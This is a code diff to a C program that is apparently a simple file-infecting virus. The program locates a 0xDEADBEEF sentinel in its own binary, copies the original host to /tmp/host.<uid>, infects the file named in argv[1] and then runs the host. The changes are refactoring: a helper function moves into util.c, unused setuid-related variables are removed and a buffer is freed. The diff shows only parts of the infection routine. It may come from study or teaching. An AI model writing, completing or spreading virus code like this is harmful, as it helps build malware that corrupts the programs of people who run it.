@@ -7,17 +7,17 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <strings.h>
-#include <unistd.h>
 #include <sys/wait.h>
 
-off_t sentinelOffset(int fd);
+#include "util.c"
+
 int runHost(char* hostFile, char ** argv);
 
 int main(int argc, char** argv){
 	int thisFileFd, tmpHostFd, toInfectFd;
 	int i;
 	off_t sentinelOff;
-	uid_t ruid, euid, suid;
+	uid_t ruid, euid;
 	char tmpHostFileName[30];
 	unsigned char buf;
 	struct stat arg1Stat;
@@ -27,9 +27,7 @@ int main(int argc, char** argv){
 	thisFileFd = open(argv[0], O_RDONLY);
 	ruid = getuid();
 	euid = geteuid();
-	suid = getuid();
 
-	//getresuid(&ruid, &euid, &suid);
 	sprintf(tmpHostFileName,"/tmp/host.%d", ruid);
 	tmpHostFd = open(tmpHostFileName, O_WRONLY|O_CREAT|O_EXCL, S_IXUSR);
 	if(tmpHostFd==-1){
@@ -86,6 +84,7 @@ int main(int argc, char** argv){
 		close(tmpHostFd);
 		close(thisFileFd);
 		close(toInfectFd);
+		free(arg1Buf);
 		return runHost(tmpHostFileName, argv);
 	}else{
 		//printf("argv[1] didn't seem legit to infect\n");
@@ -108,35 +107,4 @@ int runHost(char* hostFile, char ** argv){
 	}
 	unlink(hostFile);
 	return childStatus;// return actual status from wait here.
-}
-
-off_t sentinelOffset(int fd){
-	lseek(fd, 0, SEEK_SET);
-	unsigned char buf, expected;
-	expected = 0xDE;
-	while(read(fd,&buf,1) !=0){
-		if(buf==expected){
-			//set expected to next, or return the offset
-			switch(expected){
-			case 0xDE:
-				expected=0xAD;
-				break;
-			case 0xAD:
-				expected=0xBE;
-				break;
-			case 0xBE:
-				expected=0xEF;
-				break;
-			case 0xEF:
-				return lseek(fd,0,SEEK_CUR)-4;
-			default:
-				printf("Major ERROR!\n");
-				break;
-			}
-		}else{
-			//reset expected
-			expected = 0xDE;
-		}
-	}
-	return -1;
 }
